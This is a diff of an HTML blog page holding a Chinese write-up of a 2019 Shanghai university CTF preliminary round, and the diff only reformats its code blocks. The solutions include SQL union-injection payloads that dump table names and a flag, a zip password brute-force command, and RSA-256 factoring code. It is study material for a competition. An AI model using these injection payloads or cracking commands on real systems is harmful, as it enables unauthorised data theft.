@@ -87,13 +87,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    36k
+                    24k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    33 mins.
+                    22 mins.
                 </span>
                 
                 
@@ -135,8 +135,10 @@
 <p>联合注入测试成功</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-2.png" alt="1-2"></p>
 <p>爆数据库、表、列、flag值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,2,3,table_name from information_schema.tables where table_schema=database() #</span><br><span class="line">-1&apos; union select 1,2,3,column_name from information_schema.columns where table_name=&apos;flag&apos; #</span><br><span class="line">-1&apos; union select 1,2,3,flag from flag #</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-3.png" alt="1-3"></p>
+<pre><code>-1&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=database() #
+-1&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;flag&#39; #
+-1&#39; union select 1,2,3,flag from flag #
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-3.png" alt="1-3"></p>
 <p><code>flag{ 20_welcome_19 }</code></p>
 <hr>
 <h3 id="第二题（吴佩孚）"><a href="#第二题（吴佩孚）" class="headerlink" title="第二题（吴佩孚）"></a>第二题（吴佩孚）</h3><p>链接打开发现是Base64</p>
@@ -155,8 +157,8 @@
 <p>既然缺少信息，就放到winhex里面看一下，在末尾发现zero字样</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-3.png" alt="3-3"></p>
 <p>再看刚才的那串数字，想会不会是MD5，然后往空处补上0，刚好32位得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">85a9d4517d47250b908cbc9fd0554216</span><br></pre></td></tr></table></figure>
-<p>拿去在线网站解密一下，拿到flag</p>
+<pre><code>85a9d4517d47250b908cbc9fd0554216
+</code></pre><p>拿去在线网站解密一下，拿到flag</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-4.png" alt="3-4"></p>
 <p><code>flag{hsd132456}</code></p>
 <hr>
@@ -166,7 +168,21 @@
 <p>%3D就是等号（=）的URL编码</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-2.png" alt="4-2"></p>
 <p>判断是base64混合url循环编码，直接写个Python脚本解码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">s = <span class="string">'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVm1oRFZWWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbXRXTVhCRlZXeHdWMDFFUlRCV2Fra3hVakZhV0ZOcmFGWmlhMHBYV1d4b1UwMHhWWGhYYlhSWFRWWndNRlZ0ZUZOVWJVWTJVbFJDVjJFeVRYaFdSRVpyVTBaT2NscEhjRk5XUjNob1YxZDRiMVV4VWtkWGJrNVlZbGhTV0ZSV1pEQk9iR3hXVjJ4T1ZXSkdjRlpXYlhoelZqRmFObEZZYUZkU1JYQklWbXBHVDFkV2NFZGhSMnhUWVROQ1dsWXhXbXROUjFGNVZXNU9hbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKWVFrbFdiWEJIVkRGa1YyTkZaR2hTTW5oVVdWUk9RMWRzV1hoWGJYUk9VbTE0V0ZaWGRHdFdNV1JJWVVac1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5TUmxweFUydGFiRlpzU2xwWlZWcHJZVWRGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZWYldoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxkSFVsWlVWbHBIVFRGU2MxWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreU1VZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0hKWlZXUkdaVWRPU0U5V2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTVc5bGJHUllaVWM1YVUxWFVucFdNV2h2VjBkS1dWVnJPVlppVkVVd1ZqQmFZVmRIVWtoa1JtUnBWbGhDU2xkV1ZtOVVNVnAwVW01S1QxWnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbFVRWGhUUmtweVdrWm9hV0Y2Vm5oV1ZFSnZVVEZzVjFWc1dsaGlWVnB6V1d0YWQyVkdWWGxrUjNSb1lsVndWMWx1Y0V0V2JGbDZZVVJPV21FeVVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVjFsc2FFTldSbXhaWTBaa2EwMVdjREJaTUZZd1lWVXhXRlZyYUZkTmFsWlVWa2Q0UzFKc1pIVlRiRlpYWWtoQ05sWkhlR0ZaVm1SR1RsWmFVRlp0YUZSWmJGcExVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYlVaVlZteHdNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnNiRnBOTW1oWVZGWmFTMVZHY0VWU2EzQnNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdibEpzVTBkU2NGVnFRbmRXTVZsNVpFaGtWMDFFUmpGWlZWSlBWMjFGZVZWclpHRldNMmhJV1RKemVGWXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWVzVTVjJFeVVtaFZNRnBoVmpGc2MxcEVVbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaFhSbFp6WVVaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlXV3RvUTFkV1draGtSMFpvVFdzMWVsWXlOVk5oTVVsNVlVWm9XbFpGTlVSVk1WcHJWbFpHZEZKc1drNVdNVWwzVmxkNGIySXhXWGhhUldob1VtMW9WbFpzV25kTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRllaRmhpUmxweVdYcEdWbVZXVG5KYVIyaE9UVzFvV1ZaR1l6RlZNV1JIVjJ4V1UyRXhjSE5WYlRGVFYyeGtjbFpVUmxkTmEzQktWVmMxYjFZeFdqWlNWRUpoVWtWYWNsVnFTa3RUVmxKMFlVWk9hR1ZzV2pSV2JUQjRaV3N4V0ZadVRsaGlSMmh4V2xkNFlWWXhVbGRYYlVaWFZteHdlbGxWYUd0V2F6RldWbXBTVjJKWVFtaFdiVEZHWkRGYWRWUnNWbGRTVlhCVVYxZDBWbVF5VVhoV2JGSlhWMGhDVkZWV1RsWmxiRXBFVmxod1UxRlRWWHBTUTFWNlVrRWxNMFFsTTBRJTNE'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="string">'%'</span> <span class="keyword">in</span> s:</span><br><span class="line">        s = urllib.parse.unquote(s)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b64decode(s)	<span class="comment">#完成后，s变为byte类型</span></span><br><span class="line">        s = s.decode()	<span class="comment">#s转换成string类型，否则while处无法使用</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import base64
+import urllib.parse
+
+s = &#39;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVm1oRFZWWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbXRXTVhCRlZXeHdWMDFFUlRCV2Fra3hVakZhV0ZOcmFGWmlhMHBYV1d4b1UwMHhWWGhYYlhSWFRWWndNRlZ0ZUZOVWJVWTJVbFJDVjJFeVRYaFdSRVpyVTBaT2NscEhjRk5XUjNob1YxZDRiMVV4VWtkWGJrNVlZbGhTV0ZSV1pEQk9iR3hXVjJ4T1ZXSkdjRlpXYlhoelZqRmFObEZZYUZkU1JYQklWbXBHVDFkV2NFZGhSMnhUWVROQ1dsWXhXbXROUjFGNVZXNU9hbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKWVFrbFdiWEJIVkRGa1YyTkZaR2hTTW5oVVdWUk9RMWRzV1hoWGJYUk9VbTE0V0ZaWGRHdFdNV1JJWVVac1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5TUmxweFUydGFiRlpzU2xwWlZWcHJZVWRGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZWYldoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxkSFVsWlVWbHBIVFRGU2MxWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreU1VZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0hKWlZXUkdaVWRPU0U5V2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTVc5bGJHUllaVWM1YVUxWFVucFdNV2h2VjBkS1dWVnJPVlppVkVVd1ZqQmFZVmRIVWtoa1JtUnBWbGhDU2xkV1ZtOVVNVnAwVW01S1QxWnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbFVRWGhUUmtweVdrWm9hV0Y2Vm5oV1ZFSnZVVEZzVjFWc1dsaGlWVnB6V1d0YWQyVkdWWGxrUjNSb1lsVndWMWx1Y0V0V2JGbDZZVVJPV21FeVVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVjFsc2FFTldSbXhaWTBaa2EwMVdjREJaTUZZd1lWVXhXRlZyYUZkTmFsWlVWa2Q0UzFKc1pIVlRiRlpYWWtoQ05sWkhlR0ZaVm1SR1RsWmFVRlp0YUZSWmJGcExVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYlVaVlZteHdNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnNiRnBOTW1oWVZGWmFTMVZHY0VWU2EzQnNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdibEpzVTBkU2NGVnFRbmRXTVZsNVpFaGtWMDFFUmpGWlZWSlBWMjFGZVZWclpHRldNMmhJV1RKemVGWXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWVzVTVjJFeVVtaFZNRnBoVmpGc2MxcEVVbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaFhSbFp6WVVaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlXV3RvUTFkV1draGtSMFpvVFdzMWVsWXlOVk5oTVVsNVlVWm9XbFpGTlVSVk1WcHJWbFpHZEZKc1drNVdNVWwzVmxkNGIySXhXWGhhUldob1VtMW9WbFpzV25kTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRllaRmhpUmxweVdYcEdWbVZXVG5KYVIyaE9UVzFvV1ZaR1l6RlZNV1JIVjJ4V1UyRXhjSE5WYlRGVFYyeGtjbFpVUmxkTmEzQktWVmMxYjFZeFdqWlNWRUpoVWtWYWNsVnFTa3RUVmxKMFlVWk9hR1ZzV2pSV2JUQjRaV3N4V0ZadVRsaGlSMmh4V2xkNFlWWXhVbGRYYlVaWFZteHdlbGxWYUd0V2F6RldWbXBTVjJKWVFtaFdiVEZHWkRGYWRWUnNWbGRTVlhCVVYxZDBWbVF5VVhoV2JGSlhWMGhDVkZWV1RsWmxiRXBFVmxod1UxRlRWWHBTUTFWNlVrRWxNMFFsTTBRJTNE&#39;
+
+while True:
+    while &#39;%&#39; in s:
+        s = urllib.parse.unquote(s)
+    try:
+        s = base64.b64decode(s)    #完成后，s变为byte类型
+        s = s.decode()    #s转换成string类型，否则while处无法使用
+    except:
+        break
+print s
+</code></pre>
 <p>果然可以得到flag</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-3.png" alt="4-3"></p>
 <p>但是这个flag还经过栅栏密码处理，找个在线网站解密一下就可以：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码传送门</a></p>
@@ -186,7 +202,22 @@
 <h3 id="第六题（戴星炳）"><a href="#第六题（戴星炳）" class="headerlink" title="第六题（戴星炳）"></a>第六题（戴星炳）</h3><p>算式的内容每2秒就会变，所以需要通过python的Session机制提交计算结果</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/6-1.png" alt="6-1"></p>
 <p>代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">a = requests.Session()</span><br><span class="line">url = <span class="string">"http://47.103.43.235:82/web/a/index.php"</span></span><br><span class="line">b = a.get(url)</span><br><span class="line">soup = BeautifulSoup(b.text,<span class="string">'lxml'</span>)</span><br><span class="line">c = re.findall(<span class="string">'&lt;p&gt;(.*)&lt;/p&gt;'</span>,str(soup.find_all(<span class="string">'p'</span>)[<span class="number">1</span>]))[<span class="number">0</span>]</span><br><span class="line">result = eval(c)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'result'</span>:result</span><br><span class="line">    &#125;</span><br><span class="line">d = a.post(url,data=data)</span><br><span class="line">print(d.text)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests,re
+from bs4 import BeautifulSoup
+
+a = requests.Session()
+url = &quot;http://47.103.43.235:82/web/a/index.php&quot;
+b = a.get(url)
+soup = BeautifulSoup(b.text,&#39;lxml&#39;)
+c = re.findall(&#39;&lt;p&gt;(.*)&lt;/p&gt;&#39;,str(soup.find_all(&#39;p&#39;)[1]))[0]
+result = eval(c)
+
+data = {
+    &#39;result&#39;:result
+    }
+d = a.post(url,data=data)
+print(d.text)
+</code></pre>
 <p>运行一下flag就出来了</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/6-2.png" alt="6-2"></p>
 <p><code>flag{Y0U_4R3_3o_F4ST!}</code></p>
@@ -201,27 +232,70 @@
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-4.png" alt="7-4"></p>
 <p>不知道管理员的QQ号，那就爆破，一般QQ号9位-11位，先从9位开始</p>
 <p>Ps：这里的-u需要特地加上去，因为不加上去不以zip格式爆破</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcracker -b -c 1 -l 9 -v -u 文件名</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-5.png" alt="7-5"></p>
+<pre><code>fcracker -b -c 1 -l 9 -v -u 文件名
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-5.png" alt="7-5"></p>
 <p>输入密码，拿到文件，打开看到flag</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-6.png" alt="7-6"></p>
 <p><code>flag{Y0U_4R3_3o_F4ST!}</code></p>
 <hr>
 <h3 id="第八题（潘汉年）"><a href="#第八题（潘汉年）" class="headerlink" title="第八题（潘汉年）"></a>第八题（潘汉年）</h3><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-1.png" alt="8-1"></p>
 <p>做个简单的测试，将代码前4个字符和flag的ASCII码进行对比，代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"bg[`"</span></span><br><span class="line">b = <span class="string">"flag"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    print(<span class="string">"密文:"</span>+ str(ord(a[i])))</span><br><span class="line">    print(<span class="string">"========"</span>)</span><br><span class="line">    print(<span class="string">"flag:"</span>+ str(ord(b[i])))</span><br><span class="line">    print(<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">a = &quot;bg[`&quot;
+b = &quot;flag&quot;
+
+for i in range(4):
+    print(&quot;密文:&quot;+ str(ord(a[i])))
+    print(&quot;========&quot;)
+    print(&quot;flag:&quot;+ str(ord(b[i])))
+    print(&quot;&quot;)
+</code></pre>
 <p>发现逐位在漂移为 4 的基础上 + 1</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-2.png" alt="8-2"></p>
 <p>根据这个还原flag，代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"bg[`sZ*Zg'dPfP`VM_SXVd"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    flag += chr(ord(a[i])+<span class="number">4</span>+i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">a = &quot;bg[`sZ*Zg&#39;dPfP`VM_SXVd&quot;
+flag = &quot;&quot;
+
+for i in range(len(a)):
+    flag += chr(ord(a[i])+4+i)
+print(flag)
+</code></pre>
 <p>拿到flag</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-3.png" alt="8-3"></p>
 <p><code>flag{c4es4r_variation}</code></p>
 <hr>
 <h3 id="第九题（袁殊）"><a href="#第九题（袁殊）" class="headerlink" title="第九题（袁殊）"></a>第九题（袁殊）</h3><p>RSA 摸熟 n 过小，导致可被分解的问题，先用 openssl 提取公钥中的 e 和 n</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in gy.key</span><br><span class="line"></span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd:</span><br><span class="line">    c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0:</span><br><span class="line">    89:12:d9</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni</span><br><span class="line">0bXTcqTQiRLZAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">openssl rsa -pubin -text -modulus -in warmup -in gy.key
+
+Public-Key: (256 bit)
+Modulus:
+    00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd:
+    c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0:
+    89:12:d9
+Exponent: 65537 (0x10001)
+Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9
+writing RSA key
+-----BEGIN PUBLIC KEY-----
+MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni
+0bXTcqTQiRLZAgMBAAE=
+-----END PUBLIC KEY-----
+</code></pre>
 <p>在 factordb.com 分解 n 得到素因子 p 和 q， 解得私钥 d，再解得明文 m</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span></span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">c = open(<span class="string">'E:\\Downloads\\CTF\\RSA256\\fllllllag.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from Crypto.Util.number import *
+
+e = 65537
+n = 0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9
+
+p = 273821108020968288372911424519201044333
+q = 280385007186315115828483000867559983517
+phi = (p - 1) * (q - 1)
+assert GCD(e, phi) == 1
+d = inverse(e, phi)
+
+c = open(&#39;E:\\Downloads\\CTF\\RSA256\\fllllllag.txt&#39;, &#39;rb&#39;).read()
+c = bytes_to_long(c)
+m = pow(c, d, n)
+print long_to_bytes(m)
+</code></pre>
